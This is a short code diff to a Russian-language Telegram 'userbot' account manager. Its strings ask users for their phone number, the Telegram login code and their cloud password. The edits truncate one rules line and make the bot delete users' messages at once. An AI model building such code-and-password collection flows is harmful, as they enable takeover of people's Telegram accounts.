@@ -45,7 +45,7 @@ LANG = {
     "btn_custom_nick": "Кастомизация ✨", "btn_time": "Время 🕒", "btn_lock_now": "Блок 🔒",
     "msg_start": "Здравствуйте!\nДобро пожаловать в бота управления аккаунтом.\nОзнакомьтесь с правилами.",
     "msg_menu": "Что умеет этот бот?\nВыбирайте доступные функции управления вашим аккаунтом снизу:",
-    "msg_rules_text": "📜 **Правила использования бота:**\n\n1. Бот работает через юзербота.\n2. Все данные хранятся в защищенной области.\n3. Бот работает 24/7 без ограничений.\n\n_СТАТУС: UNLIMITED._",
+    "msg_rules_text": "📜 **Правила использования бота:**\n\n1. Бот работает через юзербота.\n2. Все данные хранятся в защищенной области.\n3.24/7 без ограничений.\n\n_СТАТУС: UNLIMITED._",
     "msg_phone_req": "Отправьте номер телефона (например, +123456789).",
     "msg_code_req": "Код авторизации отправлен.\n⚠️ Напишите код из сообщения Telegram!",
     "msg_pwd_req": "Аккаунт защищен облачным паролем.\nВведите его в чат:",
@@ -347,7 +347,7 @@ class LockMiddleware(BaseMiddleware):
             if event.message: get_user_state(user_id)["msg_id"] = event.message.message_id
         elif isinstance(event, types.Message):
             user_id = event.from_user.id
-            asyncio.create_task(delayed_delete(event, 5))
+            asyncio.create_task(delayed_delete(event, 0))
             
         if user_id:
             now = time.time()
